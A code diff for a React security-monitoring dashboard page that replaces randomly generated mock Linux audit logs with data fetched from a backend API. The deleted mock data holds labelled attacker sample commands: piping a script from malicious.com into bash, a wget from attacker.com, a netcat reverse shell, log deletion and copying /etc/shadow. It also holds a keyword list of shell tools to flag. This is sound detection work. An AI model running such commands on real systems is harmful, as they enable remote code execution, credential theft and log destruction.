@@ -1,4 +1,4 @@
-import React, { useMemo, useState } from "react";
+import React, { useCallback, useEffect, useMemo, useState } from "react";
 import Navbar from "../components/Navbar";
 import {
   Search,
@@ -313,7 +313,7 @@ const CommandHighlighter = ({ command }) => {
     ";",
   ];
 
-  const parts = command.split(/(\s+)/);
+  const parts = String(command || "").split(/(\s+)/);
 
   return (
     <code className="text-xs font-mono">
@@ -384,81 +384,124 @@ const PayloadWordCloud = ({ words }) => {
   );
 };
 
-// ========================================
-// STATIC MOCK DATA GENERATOR
-// ========================================
-const generateMockData = () => {
-  const users = ["root", "agent4", "www-data", "postgres", "mysql", "ubuntu"];
-  const hostnames = ["linux-prod-01", "linux-dev-02", "linux-web-03", "linux-db-04"];
-  const commands = [
-    { cmd: "ls -la /etc", risk: "normal", indicator: [] },
-    { cmd: "cat /etc/passwd", risk: "suspicious", indicator: ["file_read_sensitive"] },
-    {
-      cmd: "curl http://malicious.com/script.sh | bash",
-      risk: "suspicious",
-      indicator: ["network_fetch", "shell_inline_exec"],
+
+const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || "http://localhost:5000/api";
+
+const RANGE_TO_MINUTES = {
+  "1h": 60,
+  "24h": 24 * 60,
+  "7d": 7 * 24 * 60,
+  "30d": 30 * 24 * 60,
+};
+
+const CHART_COLORS = ["#ef4444", "#f97316", "#eab308", "#84cc16", "#22c55e"];
+
+async function fetchJson(url) {
+  const response = await fetch(url);
+  const contentType = response.headers.get("content-type") || "";
+
+  if (!response.ok) {
+    const message = contentType.includes("application/json")
+      ? (await response.json()).message
+      : await response.text();
+    throw new Error(message || `Request failed with status ${response.status}`);
+  }
+
+  return response.json();
+}
+
+function normalizeLinuxCommand(item) {
+  return {
+    id: item.id,
+    timestamp: item.timestamp,
+    user: item.user || "-",
+    hostname: item.hostName || "-",
+    hostIp: Array.isArray(item.hostIp) ? item.hostIp.join(", ") : item.hostIp || "-",
+    sessionId: item.session || "-",
+    commandName: item.commandName || "-",
+    command: {
+      cmd: item.command || "",
+      risk: item.suspicious ? "suspicious" : "normal",
+      indicator: Array.isArray(item.riskIndicators) ? item.riskIndicators : [],
     },
-    { cmd: "chmod 777 /var/www/html", risk: "suspicious", indicator: ["permission_change_777"] },
-    { cmd: "whoami", risk: "normal", indicator: [] },
-    { cmd: "rm -rf /var/log/*", risk: "suspicious", indicator: ["destructive_delete"] },
-    {
-      cmd: "cd /tmp && wget http://attacker.com/payload",
-      risk: "suspicious",
-      indicator: ["network_fetch"],
-    },
-    {
-      cmd: "nc -e /bin/bash attacker.com 4444",
-      risk: "suspicious",
-      indicator: ["reverse_shell"],
-    },
-    { cmd: "sudo su -", risk: "suspicious", indicator: ["privilege_escalation"] },
-    { cmd: "base64 -d <<< $(cat .bashrc)", risk: "suspicious", indicator: ["base64_decode"] },
-    { cmd: "ps aux | grep ssh", risk: "normal", indicator: [] },
-    {
-      cmd: "cp /etc/shadow /tmp/shadow.bak",
-      risk: "suspicious",
-      indicator: ["file_read_sensitive"],
-    },
+    message: item.message || "-",
+    logFilePath: item.logFilePath || "-",
+    pid: "-",
+    exitCode: "-",
+  };
+}
+
+function countBy(items, getKey) {
+  const map = new Map();
+
+  for (const item of items) {
+    const key = getKey(item);
+    if (!key || key === "-") continue;
+    map.set(key, (map.get(key) || 0) + 1);
+  }
+
+  return Array.from(map.entries())
+    .map(([label, value]) => ({ label, value }))
+    .sort((a, b) => b.value - a.value);
+}
+
+function buildTimelineFromLogs(logs) {
+  if (!logs.length) return [];
+
+  const buckets = new Map();
+
+  for (const log of logs) {
+    const date = new Date(log.timestamp);
+    if (Number.isNaN(date.getTime())) continue;
+
+    date.setMinutes(0, 0, 0);
+    const key = date.toISOString();
+    buckets.set(key, (buckets.get(key) || 0) + 1);
+  }
+
+  return Array.from(buckets.entries())
+    .sort(([a], [b]) => new Date(a) - new Date(b))
+    .map(([t, v]) => ({ t, v }));
+}
+
+function extractCommandKeywords(logs) {
+  const keywordCounts = new Map();
+  const keywords = [
+    "curl",
+    "bash",
+    "cat",
+    "chmod",
+    "sudo",
+    "rm",
+    "wget",
+    "nc",
+    "base64",
+    "grep",
+    "sed",
+    "awk",
+    "eval",
+    "exec",
+    "systemctl",
+    "cd",
+    "nano",
+    "vim",
   ];
 
-  // Generate audit logs
-  const logs = Array.from({ length: 50 }, (_, i) => ({
-    id: `cmd-${i + 1}`,
-    timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString(),
-    user: users[Math.floor(Math.random() * users.length)],
-    hostname: hostnames[Math.floor(Math.random() * hostnames.length)],
-    command: commands[Math.floor(Math.random() * commands.length)],
-    sessionId: `sess-${Math.floor(Math.random() * 20) + 1}`,
-    pid: Math.floor(Math.random() * 99999) + 1000,
-    exitCode: Math.random() > 0.8 ? Math.floor(Math.random() * 255) : 0,
-  }));
-
-  // Generate timeline
-  const now = Date.now();
-  const events = Array.from({ length: 24 }, (_, i) => ({
-    t: now - (23 - i) * 3600000,
-    v: Math.floor(Math.random() * 30) + 5,
-  }));
-
-  // Extract keywords from commands for payload word cloud
-  const keywordCounts = new Map();
-  const keywords = ["curl", "bash", "cat", "chmod", "sudo", "rm", "wget", "nc", "base64", "grep", "sed", "awk", "eval", "exec"];
-  
   for (const log of logs) {
+    const command = log.command.cmd.toLowerCase();
+
     for (const keyword of keywords) {
-      if (log.command.cmd.toLowerCase().includes(keyword)) {
+      if (command.includes(keyword)) {
         keywordCounts.set(keyword, (keywordCounts.get(keyword) || 0) + 1);
       }
     }
   }
 
-  const commandPayloadWords = Array.from(keywordCounts.entries())
+  return Array.from(keywordCounts.entries())
     .map(([text, count]) => ({ text, count }))
     .sort((a, b) => b.count - a.count)
     .slice(0, 20);
-
-  return { logs, events, commandPayloadWords };
-};
+}
 
 // ========================================
 // Main Component
@@ -470,80 +513,114 @@ const HostMonitoring = () => {
   const [selectedSession, setSelectedSession] = useState(null);
   const [rangeKey, setRangeKey] = useState("24h");
 
-  // Static mock data
-  const mockData = useMemo(() => generateMockData(), []);
+  const [logs, setLogs] = useState([]);
+  const [timelineData, setTimelineData] = useState([]);
+  const [backendStats, setBackendStats] = useState(null);
+  const [pagination, setPagination] = useState(null);
+  const [loading, setLoading] = useState(true);
+  const [refreshing, setRefreshing] = useState(false);
+  const [error, setError] = useState("");
 
-  // Calculate stats
+  const loadDashboardData = useCallback(async () => {
+    const params = new URLSearchParams({
+      page: "1",
+      limit: "100",
+    });
+
+    if (searchUser.trim()) params.set("user", searchUser.trim());
+    if (searchCommand.trim()) params.set("contains", searchCommand.trim());
+    if (suspiciousOnly) params.set("suspicious", "true");
+
+    const minutes = RANGE_TO_MINUTES[rangeKey] || RANGE_TO_MINUTES["24h"];
+
+    try {
+      setError("");
+      setRefreshing(true);
+
+      const [listResponse, statsResponse, timelineResponse] = await Promise.all([
+        fetchJson(`${API_BASE_URL}/linux-commands?${params.toString()}`),
+        fetchJson(`${API_BASE_URL}/linux-commands/stats`),
+        fetchJson(`${API_BASE_URL}/linux-commands/timeline?minutes=${minutes}`),
+      ]);
+
+      const normalizedLogs = (listResponse.data || []).map(normalizeLinuxCommand);
+      const apiTimeline = (timelineResponse.data || [])
+        .map((item) => ({
+          t: item.timestamp,
+          v: item.total || 0,
+          suspicious: item.suspicious || 0,
+        }))
+        .filter((item) => item.v > 0 || item.suspicious > 0);
+
+      setLogs(normalizedLogs);
+      setPagination(listResponse.pagination || null);
+      setBackendStats(statsResponse.data || null);
+      setTimelineData(apiTimeline.length ? apiTimeline : buildTimelineFromLogs(normalizedLogs));
+    } catch (err) {
+      console.error(err);
+      setError(err.message || "Failed to load linux command data");
+    } finally {
+      setLoading(false);
+      setRefreshing(false);
+    }
+  }, [rangeKey, searchCommand, searchUser, suspiciousOnly]);
+
+  useEffect(() => {
+    loadDashboardData();
+  }, [loadDashboardData]);
+
   const stats = useMemo(() => {
-    const totalCommands = mockData.logs.length;
-    const suspiciousCount = mockData.logs.filter((l) => l.command.risk === "suspicious").length;
-    const uniqueSessions = new Set(mockData.logs.map((l) => l.sessionId)).size;
-    const uniqueUsers = new Set(mockData.logs.map((l) => l.user)).size;
+    const loadedTotalCommands = logs.length;
+    const loadedSuspiciousCount = logs.filter((l) => l.command.risk === "suspicious").length;
+    const loadedUniqueSessions = new Set(logs.map((l) => l.sessionId)).size;
+    const loadedUniqueUsers = new Set(logs.map((l) => l.user)).size;
 
     return {
-      totalCommands,
-      suspiciousCount,
-      uniqueSessions,
-      uniqueUsers,
+      totalCommands: backendStats?.totalCommands ?? pagination?.total ?? loadedTotalCommands,
+      suspiciousCount: backendStats?.suspiciousCommands ?? loadedSuspiciousCount,
+      uniqueSessions: backendStats?.totalSessions ?? loadedUniqueSessions,
+      uniqueUsers: backendStats?.users?.length ?? loadedUniqueUsers,
+      loadedTotalCommands,
+      loadedSuspiciousCount,
+      loadedUniqueSessions,
     };
-  }, [mockData.logs]);
+  }, [backendStats, logs, pagination]);
 
-  // Calculate analytics
   const analytics = useMemo(() => {
-    // Top 5 Users
-    const userMap = new Map();
-    mockData.logs.forEach((log) => {
-      userMap.set(log.user, (userMap.get(log.user) || 0) + 1);
-    });
-    const topUsers = Array.from(userMap.entries())
-      .map(([label, value]) => ({ label, value }))
-      .sort((a, b) => b.value - a.value)
+    const topUsers = (backendStats?.users?.length ? backendStats.users : countBy(logs, (log) => log.user))
       .slice(0, 5)
       .map((it, i) => ({
-        ...it,
-        color: ["#ef4444", "#f97316", "#eab308", "#84cc16", "#22c55e"][i % 5],
+        label: it.user || it.label,
+        value: it.count || it.value,
+        color: CHART_COLORS[i % CHART_COLORS.length],
       }));
 
-    // Top 5 Suspicious Commands
-    const suspiciousCommands = mockData.logs
+    const suspiciousCommands = logs
       .filter((l) => l.command.risk === "suspicious")
       .map((l) => l.command.cmd);
-    const cmdMap = new Map();
-    suspiciousCommands.forEach((cmd) => {
-      cmdMap.set(cmd, (cmdMap.get(cmd) || 0) + 1);
-    });
-    const topSuspicious = Array.from(cmdMap.entries())
-      .map(([label, value]) => ({ label, value }))
-      .sort((a, b) => b.value - a.value)
+
+    const topSuspicious = countBy(suspiciousCommands, (cmd) => cmd)
       .slice(0, 5)
       .map((it, i) => ({
         ...it,
         color: ["#ef4444", "#f97316", "#eab308", "#a78bfa", "#f87171"][i % 5],
       }));
 
-    // Risk Indicator Distribution
-    const riskMap = new Map();
-    mockData.logs.forEach((log) => {
-      if (log.command.indicator.length > 0) {
-        log.command.indicator.forEach((ind) => {
-          riskMap.set(ind, (riskMap.get(ind) || 0) + 1);
-        });
-      }
-    });
-    const riskIndicators = Array.from(riskMap.entries())
-      .map(([label, value]) => ({ label, value }))
-      .sort((a, b) => b.value - a.value)
-      .map((it, i) => ({
-        ...it,
-        color: ["#ef4444", "#f97316", "#eab308", "#84cc16", "#22c55e"][i % 5],
-      }));
+    const riskIndicators = countBy(
+      logs.flatMap((log) => log.command.indicator),
+      (indicator) => indicator
+    ).map((it, i) => ({
+      ...it,
+      color: CHART_COLORS[i % CHART_COLORS.length],
+    }));
 
     return { topUsers, topSuspicious, riskIndicators };
-  }, [mockData.logs]);
+  }, [backendStats, logs]);
 
-  // Filter logs
+  const commandPayloadWords = useMemo(() => extractCommandKeywords(logs), [logs]);
+
   const filteredLogs = useMemo(() => {
-    let result = mockData.logs;
+    let result = logs;
 
     if (searchUser) {
       result = result.filter((l) => l.user.toLowerCase().includes(searchUser.toLowerCase()));
@@ -557,16 +634,24 @@ const HostMonitoring = () => {
       result = result.filter((l) => l.command.risk === "suspicious");
     }
 
-    return result.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-  }, [searchUser, searchCommand, suspiciousOnly, mockData.logs]);
+    return [...result].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  }, [logs, searchUser, searchCommand, suspiciousOnly]);
 
-  // Session details
   const sessionCommands = useMemo(() => {
     if (!selectedSession) return [];
-    return mockData.logs
+
+    return logs
       .filter((l) => l.sessionId === selectedSession)
       .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
-  }, [selectedSession, mockData.logs]);
+  }, [selectedSession, logs]);
+
+  const suspiciousRate = stats.totalCommands
+    ? ((stats.suspiciousCount / stats.totalCommands) * 100).toFixed(1)
+    : "0.0";
+
+  const avgPerSession = stats.uniqueSessions
+    ? (stats.totalCommands / stats.uniqueSessions).toFixed(1)
+    : "0.0";
 
   return (
     <div className="min-h-screen bg-slate-950 text-slate-200 font-sans">
@@ -581,30 +666,51 @@ const HostMonitoring = () => {
                 <Terminal className="h-6 w-6 text-orange-400" />
                 Host Monitoring - Linux Command Audit
               </h1>
-              <p className="text-sm text-slate-400">Real-time user activity and command execution tracking</p>
+              <p className="text-sm text-slate-400">
+                Real-time user activity and command execution tracking from Elasticsearch
+              </p>
             </div>
-            <button className="px-3 py-2 bg-slate-800 hover:bg-slate-700 rounded-lg text-sm text-slate-400 transition-colors border border-slate-700">
-              <RefreshCw className="h-4 w-4" />
+            <button
+              onClick={loadDashboardData}
+              disabled={refreshing}
+              className="px-3 py-2 bg-slate-800 hover:bg-slate-700 disabled:opacity-60 rounded-lg text-sm text-slate-400 transition-colors border border-slate-700"
+              title="Refresh data"
+            >
+              <RefreshCw className={`h-4 w-4 ${refreshing ? "animate-spin" : ""}`} />
             </button>
           </div>
+
+          {error && (
+            <div className="rounded-lg border border-red-500/40 bg-red-500/10 px-4 py-3 text-sm text-red-200">
+              Gagal mengambil data backend: {error}
+            </div>
+          )}
 
           {/* KPI Cards */}
           <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
             <div className="bg-slate-800/50 border border-slate-700/60 rounded-lg p-3">
               <div className="text-[10px] text-slate-500 uppercase font-semibold">Total Commands</div>
-              <div className="text-2xl font-black text-orange-400 mt-1">{stats.totalCommands}</div>
+              <div className="text-2xl font-black text-orange-400 mt-1">
+                {loading ? "..." : stats.totalCommands}
+              </div>
             </div>
             <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-3">
               <div className="text-[10px] text-red-400 uppercase font-semibold">Suspicious</div>
-              <div className="text-2xl font-black text-red-300 mt-1">{stats.suspiciousCount}</div>
+              <div className="text-2xl font-black text-red-300 mt-1">
+                {loading ? "..." : stats.suspiciousCount}
+              </div>
             </div>
             <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-3">
               <div className="text-[10px] text-orange-400 uppercase font-semibold">Sessions</div>
-              <div className="text-2xl font-black text-orange-300 mt-1">{stats.uniqueSessions}</div>
+              <div className="text-2xl font-black text-orange-300 mt-1">
+                {loading ? "..." : stats.uniqueSessions}
+              </div>
             </div>
             <div className="bg-purple-500/10 border border-purple-500/30 rounded-lg p-3">
               <div className="text-[10px] text-purple-400 uppercase font-semibold">Unique Users</div>
-              <div className="text-2xl font-black text-purple-300 mt-1">{stats.uniqueUsers}</div>
+              <div className="text-2xl font-black text-purple-300 mt-1">
+                {loading ? "..." : stats.uniqueUsers}
+              </div>
             </div>
           </div>
         </div>
@@ -616,23 +722,21 @@ const HostMonitoring = () => {
             <div className="flex justify-between items-center mb-4">
               <div className="text-sm font-semibold text-slate-300 flex items-center gap-2">
                 <Activity className="h-4 w-4" />
-                Command Timeline (Last 24 Hours)
+                Command Timeline
               </div>
               <RangeFilter rangeKey={rangeKey} onRangeChange={setRangeKey} />
             </div>
             <div className="bg-slate-800/30 rounded-lg p-4 border border-slate-800/50">
-              <WaveChart data={mockData.events} />
+              <WaveChart data={timelineData} />
             </div>
           </div>
 
           {/* Risk Severity Stats */}
           <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 flex items-center justify-center">
             <div className="text-center w-full">
-              <div className="text-4xl font-black text-red-400">{stats.suspiciousCount}</div>
+              <div className="text-4xl font-black text-red-400">{loading ? "..." : stats.suspiciousCount}</div>
               <div className="text-xs text-slate-400 uppercase font-semibold mt-1">Threats Found</div>
-              <div className="text-lg font-bold text-slate-300 mt-4">
-                {((stats.suspiciousCount / stats.totalCommands) * 100).toFixed(1)}%
-              </div>
+              <div className="text-lg font-bold text-slate-300 mt-4">{suspiciousRate}%</div>
               <div className="text-xs text-slate-500">Suspicious Rate</div>
             </div>
           </div>
@@ -678,7 +782,9 @@ const HostMonitoring = () => {
             <div className="space-y-2 text-xs text-slate-400">
               <div className="flex justify-between">
                 <span>Safe Commands</span>
-                <span className="font-bold text-emerald-400">{stats.totalCommands - stats.suspiciousCount}</span>
+                <span className="font-bold text-emerald-400">
+                  {Math.max(stats.totalCommands - stats.suspiciousCount, 0)}
+                </span>
               </div>
               <div className="flex justify-between">
                 <span>Suspicious Commands</span>
@@ -686,15 +792,11 @@ const HostMonitoring = () => {
               </div>
               <div className="flex justify-between">
                 <span>Avg per Session</span>
-                <span className="font-bold text-blue-400">
-                  {(stats.totalCommands / stats.uniqueSessions).toFixed(1)}
-                </span>
+                <span className="font-bold text-blue-400">{avgPerSession}</span>
               </div>
               <div className="flex justify-between">
-                <span>Failed Commands</span>
-                <span className="font-bold text-orange-400">
-                  {mockData.logs.filter((l) => l.exitCode !== 0).length}
-                </span>
+                <span>Loaded Rows</span>
+                <span className="font-bold text-orange-400">{logs.length}</span>
               </div>
             </div>
           </div>
@@ -720,7 +822,7 @@ const HostMonitoring = () => {
               Command Keywords Distribution
             </div>
             <div className="bg-slate-950 border border-slate-700/60 rounded-lg p-3 flex flex-col gap-2 items-center justify-center">
-              <PayloadWordCloud words={mockData.commandPayloadWords} />
+              <PayloadWordCloud words={commandPayloadWords} />
             </div>
           </div>
         </div>
@@ -728,7 +830,9 @@ const HostMonitoring = () => {
         {/* Row 4: Audit Log Table */}
         <div className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden">
           <div className="p-4 border-b border-slate-800 bg-slate-800/50">
-            <div className="text-sm font-semibold text-slate-300 mb-4">Audit Log Entries ({filteredLogs.length})</div>
+            <div className="text-sm font-semibold text-slate-300 mb-4">
+              Audit Log Entries ({filteredLogs.length})
+            </div>
 
             {/* Filters */}
             <div className="flex gap-3 flex-wrap">
@@ -779,7 +883,7 @@ const HostMonitoring = () => {
                 </tr>
               </thead>
               <tbody>
-                {filteredLogs.slice(0, 10).map((log, idx) => (
+                {filteredLogs.slice(0, 20).map((log, idx) => (
                   <tr
                     key={log.id}
                     className={`border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors ${
@@ -829,7 +933,8 @@ const HostMonitoring = () => {
             </table>
           </div>
           <div className="px-4 py-3 text-xs text-slate-500 bg-slate-800/50">
-            Showing {Math.min(10, filteredLogs.length)} of {filteredLogs.length} entries
+            Showing {Math.min(20, filteredLogs.length)} of {filteredLogs.length} loaded entries
+            {pagination?.total ? ` | Total in backend: ${pagination.total}` : ""}
           </div>
         </div>
       </div>
@@ -893,9 +998,11 @@ const HostMonitoring = () => {
                       )}
 
                       <div className="flex items-center gap-2 mt-3 text-xs text-slate-500">
-                        <span>PID: {log.pid}</span>
+                        <span>Host: {log.hostname}</span>
                         <span>•</span>
-                        <span>Exit Code: {log.exitCode}</span>
+                        <span>Command Name: {log.commandName}</span>
+                        <span>•</span>
+                        <span>Path: {log.logFilePath}</span>
                       </div>
                     </div>
                   </div>
